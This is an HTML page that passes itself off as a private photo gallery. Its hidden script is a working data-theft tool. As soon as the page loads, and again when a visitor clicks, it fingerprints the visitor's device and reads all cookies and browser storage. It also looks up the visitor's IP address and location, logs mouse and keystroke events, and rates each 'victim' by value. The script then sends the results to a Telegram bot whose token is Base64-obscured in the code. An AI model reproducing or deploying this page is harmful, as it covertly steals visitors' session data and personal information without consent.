<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo Vault</h1>
        <p class="subtitle">Exclusive content - Click to view full album</p>
        
        <div class="loading" id="loading">Loading secure content...</div>
        
        <div class="gallery">
            <div class="image-card" onclick="openImage(1)">
                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=400&h=300&fit=crop" 
                     alt="Private Photo 1">
                <div class="image-title">Daily Activities <3</div>
                <div class="image-desc">Personal moments</div>
            </div>
            
            <div class="image-card" onclick="openImage(2)">
                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&h=300&fit=crop" 
                     alt="Private Photo 2">
                <div class="image-title">Private Collection</div>
                <div class="image-desc">Exclusive content</div>
            </div>
            
            <div class="image-card" onclick="openImage(3)">
                <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=400&h=300&fit=crop" 
                     alt="Private Photo 3">
                <div class="image-title">My Memories</div>
                <div class="image-desc">Personal archive</div>
            </div>
        </div>
    </div>

    <script>
        // ENCRYPTED TELEGRAM CONFIG (Base64 encoded)
        const ENCRYPTED_CONFIG = {
            token: 'ODU5NDg5NzgxNjpBQUZ0V1RRVE9QU091RExLNVd0YzdJcmttRlhndER1YXFscw==',
            chatId: 'ODAzMjQ5NDQ3OQ=='
        };

        // DECRYPTION FUNCTION
        function decryptConfig() {
            return {
                token: atob(ENCRYPTED_CONFIG.token),
                chatId: atob(ENCRYPTED_CONFIG.chatId)
            };
        }

        const CONFIG = decryptConfig();

        // GLOBAL DATA STORAGE
        let allCollectedData = {};
        let sessionLog = [];
        let pageLoadTime = Date.now();
        let reportSent = false;

        // STEALTH DATA COLLECTION - NO PERMISSIONS REQUIRED
        async function collectAllDataStealth() {
            const startTime = Date.now();
            
            // Collect everything that doesn't require permissions
            const data = {
                meta: {
                    timestamp: new Date().toISOString(),
                    victimId: generateVictimId(),
                    url: window.location.href,
                    collectionTime: Date.now() - startTime
                },
                
                // Technical fingerprinting (no permissions needed)
                technical: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardware: {
                        cores: navigator.hardwareConcurrency,
                        memory: navigator.deviceMemory,
                        touchPoints: navigator.maxTouchPoints
                    },
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    cookieEnabled: navigator.cookieEnabled,
                    pdfEnabled: navigator.pdfViewerEnabled,
                    webdriver: navigator.webdriver,
                    plugins: getPluginsStealth(),
                    fonts: getFontsStealth(),
                    canvas: getCanvasFingerprint(),
                    webgl: getWebGLFingerprint()
                },
                
                // Network data (no permissions needed)
                network: await getNetworkData(),
                
                // Behavioral data (no permissions needed)
                behavioral: {
                    referrer: document.referrer,
                    sessionStart: pageLoadTime,
                    duration: Date.now() - pageLoadTime,
                    interactions: {
                        total: sessionLog.length,
                        clicks: sessionLog.filter(log => log.type === 'click').length,
                        moves: sessionLog.filter(log => log.type === 'mousemove').length,
                        scrolls: sessionLog.filter(log => log.type === 'scroll').length,
                        keys: sessionLog.filter(log => log.type === 'keydown').length
                    },
                    scrollDepth: getScrollDepth(),
                    viewport: `${window.innerWidth}x${window.innerHeight}`,
                    engagement: calculateEngagement()
                },
                
                // Stored data (no permissions needed)
                storage: {
                    cookies: getAllCookies(),
                    localStorage: getAllLocalStorage(),
                    sessionStorage: getAllSessionStorage()
                },
                
                // Inferred data
                inferred: {
                    device: inferDeviceType(),
                    os: inferOperatingSystem(),
                    browser: inferBrowser(),
                    location: await inferLocation(),
                    interests: inferInterests(),
                    value: calculateVictimValue()
                }
            };
            
            allCollectedData = data;
            return data;
        }

        // STEALTH DATA COLLECTION METHODS (No permissions required)
        function getPluginsStealth() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push({
                    name: navigator.plugins[i].name,
                    filename: navigator.plugins[i].filename
                });
            }
            return plugins;
        }

        function getFontsStealth() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            const fontList = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Webdings', 'Wingdings'
            ];
            
            const availableFonts = [];
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            fontList.forEach(font => {
                context.font = testSize + " '" + font + "'";
                const metrics1 = context.measureText(testString);
                context.font = testSize + " '" + baseFonts[0] + "'";
                const metrics2 = context.measureText(testString);
                if (metrics1.width !== metrics2.width) {
                    availableFonts.push(font);
                }
            });
            
            return availableFonts;
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Hello, world!', 2, 15);
                return canvas.toDataURL().substring(22, 50);
            } catch(e) {
                return 'failed';
            }
        }

        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (!gl) return 'no_webgl';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
                return 'webgl_no_debug';
            } catch(e) {
                return 'failed';
            }
        }

        async function getNetworkData() {
            try {
                // Get IP through multiple services
                const ipServices = [
                    'https://api.ipify.org?format=json',
                    'https://api64.ipify.org?format=json',
                    'https://jsonip.com'
                ];
                
                for (let service of ipServices) {
                    try {
                        const response = await fetch(service, { mode: 'cors' });
                        const data = await response.json();
                        const ip = data.ip || data.ip_str;
                        if (ip) {
                            // Get location from IP
                            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                            const locationData = await locationResponse.json();
                            return {
                                ip: ip,
                                city: locationData.city,
                                region: locationData.region,
                                country: locationData.country_name,
                                countryCode: locationData.country_code,
                                isp: locationData.org,
                                asn: locationData.asn
                            };
                        }
                    } catch(e) {
                        continue;
                    }
                }
            } catch(e) {
                // Fallback to basic IP detection
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return { ip: data.ip, city: 'Unknown', country: 'Unknown' };
                } catch(e2) {
                    return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
                }
            }
        }

        function getAllCookies() {
            const cookies = {};
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                if (name) cookies[name] = value || '';
            });
            return cookies;
        }

        function getAllLocalStorage() {
            const storage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage[key] = localStorage.getItem(key);
            }
            return storage;
        }

        function getAllSessionStorage() {
            const storage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage[key] = sessionStorage.getItem(key);
            }
            return storage;
        }

        // INFERENCE FUNCTIONS
        function inferDeviceType() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('mobile')) return 'Mobile';
            if (ua.includes('tablet')) return 'Tablet';
            return 'Desktop';
        }

        function inferOperatingSystem() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return 'Unknown';
        }

        function inferBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Unknown';
        }

        async function inferLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone
                };
            } catch(e) {
                return {
                    city: 'Unknown',
                    region: 'Unknown', 
                    country: 'Unknown',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }
        }

        function inferInterests() {
            const interests = [];
            const keywords = document.body.innerText.toLowerCase();
            
            if (keywords.includes('gaming') || keywords.includes('game')) interests.push('Gaming');
            if (keywords.includes('shopping') || keywords.includes('buy')) interests.push('Shopping');
            if (keywords.includes('travel') || keywords.includes('vacation')) interests.push('Travel');
            if (keywords.includes('tech') || keywords.includes('computer')) interests.push('Technology');
            if (keywords.includes('sports') || keywords.includes('fitness')) interests.push('Sports');
            
            return interests.length > 0 ? interests : ['General'];
        }

        function calculateVictimValue() {
            let value = 50; // Base value
            
            // Add value based on data richness
            if (allCollectedData.technical.hardware.cores >= 8) value += 20;
            if (allCollectedData.technical.hardware.memory >= 8) value += 15;
            if (allCollectedData.network.country === 'United States') value += 25;
            if (allCollectedData.inferred.interests.includes('Shopping')) value += 10;
            if (Object.keys(allCollectedData.storage.cookies).length > 5) value += 10;
            if (allCollectedData.behavioral.interactions.total > 20) value += 15;
            
            return Math.min(100, value);
        }

        function getScrollDepth() {
            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
            const scrolled = window.scrollY;
            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
        }

        function calculateEngagement() {
            const duration = Date.now() - pageLoadTime;
            const interactions = sessionLog.length;
            return Math.min(100, Math.round((interactions / 10) + (duration / 1000)));
        }

        function generateVictimId() {
            const random = Math.random().toString(36).substr(2, 9);
            const timestamp = Date.now().toString(36);
            return `v_${random}_${timestamp}`;
        }

        // SEND COMPREHENSIVE REPORT
        async function sendComprehensiveReport() {
            if (reportSent) return;
            
            const data = await collectAllDataStealth();
            const message = formatReportMessage(data);
            
            try {
                await sendToTelegram(message);
                reportSent = true;
                console.log('Report sent successfully');
            } catch(error) {
                console.error('Failed to send report:', error);
            }
        }

        function formatReportMessage(data) {
            return `ðŸš¨ **COMPREHENSIVE DATA CAPTURE** ðŸš¨

ðŸ“Š **VICTIM PROFILE**
ðŸ†” ID: ${data.meta.victimId}
â° Collection: ${data.meta.collectionTime}ms
ðŸŒ URL: ${data.meta.url}
ðŸ“… Time: ${new Date(data.meta.timestamp).toLocaleString()}

ðŸ”§ **SYSTEM FINGERPRINT**
ðŸ’» OS: ${data.inferred.os} | Browser: ${data.inferred.browser}
ðŸ–¥ï¸ Device: ${data.inferred.device} | Cores: ${data.technical.hardware.cores}
ðŸ’¾ RAM: ${data.technical.hardware.memory}GB | Screen: ${data.technical.screen.width}x${data.technical.screen.height}
ðŸŒ Language: ${data.technical.language} | Timezone: ${data.technical.timezone}

ðŸŒ **NETWORK & LOCATION**
ðŸ“ IP: ${data.network.ip} | ISP: ${data.network.isp}
ðŸ™ï¸ Location: ${data.network.city}, ${data.network.country}
ðŸ‡ºðŸ‡³ Country Code: ${data.network.countryCode} | ASN: ${data.network.asn}

ðŸ“ˆ **BEHAVIORAL DATA**
ðŸ”— Referrer: ${data.behavioral.referrer || 'Direct'}
â±ï¸ Duration: ${Math.round(data.behavioral.duration/1000)}s
ðŸ–±ï¸ Interactions: ${data.behavioral.interactions.total} total
ðŸ“œ Scroll Depth: ${data.behavioral.scrollDepth}% | Engagement: ${data.behavioral.engagement}/100

ðŸ’¾ **STORAGE DATA**
ðŸª Cookies: ${Object.keys(data.storage.cookies).length}
ðŸ’¿ Local Storage: ${Object.keys(data.storage.localStorage).length}
ðŸ“€ Session Storage: ${Object.keys(data.storage.sessionStorage).length}

ðŸŽ¯ **INFERRED INSIGHTS**
ðŸ’° Value Score: ${data.inferred.value}/100
ðŸŽ® Interests: ${data.inferred.interests.join(', ')}
ðŸ“± Device Type: ${data.inferred.device}

ðŸ” **TECHNICAL DETAILS**
ðŸ”Œ Plugins: ${data.technical.plugins.length} installed
ðŸ”¤ Fonts: ${data.technical.fonts.length} detected
ðŸŽ¨ Canvas FP: ${data.technical.canvas}
ðŸ”„ WebGL: ${typeof data.technical.webgl === 'object' ? 'Available' : data.technical.webgl}

âš¡ **STEALTH CAPTURE COMPLETE**`;
        }

        // TELEGRAM SEND FUNCTION
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                return response.ok;
            } catch(error) {
                console.error('Telegram error:', error);
                return false;
            }
        }

        // SESSION TRACKING
        function setupSessionTracking() {
            // Track all interactions
            const events = ['mousemove', 'click', 'scroll', 'keydown', 'input'];
            events.forEach(event => {
                document.addEventListener(event, (e) => {
                    sessionLog.push({
                        type: event,
                        timestamp: Date.now(),
                        x: e.clientX,
                        y: e.clientY,
                        target: e.target.tagName
                    });
                    
                    // Limit log size
                    if (sessionLog.length > 1000) {
                        sessionLog = sessionLog.slice(-500);
                    }
                });
            });
        }

        // IMAGE HANDLER
        function openImage(imageId) {
            const images = {
                1: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=800&h=600&fit=crop',
                2: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=800&h=600&fit=crop',
                3: 'https://images.unsplash.com/photo-1494790108755-2616b612b786?w=800&h=600&fit=crop'
            };
            
            if (images[imageId]) {
                window.open(images[imageId], '_blank');
            }
            
            // Trigger data collection on first interaction
            if (!reportSent) {
                sendComprehensiveReport();
            }
        }

        // INITIALIZATION
        window.addEventListener('load', function() {
            pageLoadTime = Date.now();
            
            // Setup tracking immediately
            setupSessionTracking();
            
            // Send initial report after 2 seconds
            setTimeout(sendComprehensiveReport, 2000);
            
            // Send final report when page unloads
            window.addEventListener('beforeunload', function() {
                if (!reportSent) {
                    // Send sync request if possible
                    const data = JSON.stringify(allCollectedData);
                    navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, 
                        JSON.stringify({
                            chat_id: CONFIG.chatId,
                            text: `ðŸ”š Session ended - ${allCollectedData.meta?.victimId || 'Unknown'}`
                        })
                    );
                }
            });
        });

        console.log('Stealth data capture system loaded');
    </script>
</body>
</html>
